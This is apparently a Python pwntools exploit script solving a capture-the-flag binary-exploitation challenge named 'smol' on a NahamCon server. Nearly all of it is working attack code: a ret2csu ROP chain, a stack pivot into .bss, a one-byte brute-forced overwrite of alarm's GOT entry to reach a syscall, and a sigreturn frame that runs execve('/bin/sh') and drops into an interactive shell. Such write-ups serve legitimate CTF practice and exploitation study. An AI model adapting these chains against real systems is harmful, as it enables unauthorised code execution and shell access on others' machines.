#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 32484 ./smol
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./smol')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32484)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x00000000004011d3
# b *0x4011b0
b *0x0000000000401163
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


# print hex(libc.sym["system"])
# print hex(libc.sym["setvbuf"])
add_rbp_ebx =  0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
pop_csu = 0x4011ca
call_csu= 0x4011b0
leave = 0x401163
libc_ending = 5
# remote 0xfffce180
# local 0xfffd2180
print hex(libc_ending)
alarm_got = exe.got["alarm"]
read_got = exe.got["read"]
alarm_plt = exe.plt["alarm"]
read_plt = exe.plt["read"]
pop_rdi = 0x00000000004011d3
pop_rsi = 0x00000000004011d1
bss = 0x0000000000404000 + 0x300
ret = 0x401164

bss= 0x0000000000404000
stack_bss = bss + 0x100

len_csu = 120

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0):
    p_csu = p64(pop_csu)
    p_csu += p64(0) # rbx
    p_csu += p64(0+1) # rbp
    p_csu += p64(edi) # r12
    p_csu += p64(rsi) # r13
    p_csu += p64(rdx) # r14
    p_csu += p64(call_func) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu


def exploit(brute):
    p = 'a'*12
    p += ret2csu(read_got, 0, stack_bss + 0x8, 0x300, rbp_a = stack_bss )
    p += p64(leave) # leave; ret
    p = p.ljust(0x200,'\x00')
    io.send(p)

    p = ret2csu(read_got, 0, alarm_got, 1, rbp_a = stack_bss + 0x8 + len_csu)
    p += p64(0x000000000040115e) # mov rax, 0; leave; ret
    p += ret2csu(read_got, 0, stack_bss, 15)
    p += p64(alarm_plt)

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = stack_bss
    frame.rsp = stack_bss
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = alarm_plt
    p += str(frame)
    # p += "/bin/sh\x00"

    p = p.ljust(0x300,'\x00')
    io.send(p)

    io.send(p8(brute))
    io.send("/bin/sh\x00".ljust(15,'\x00'))

io = start()
exploit(0x75)
io.interactive()

# for i in range(255):
#     try:
#         print (i)
#         io = start()
#         exploit(i)
#         io.sendline("echo AAAAAAAA") # 40
#         io.interactive()
#         # if "AAAA" in io.recv():
#         #     print "found"
#         #     io.interactive()
#         #     break
#     except:
#         io.close()
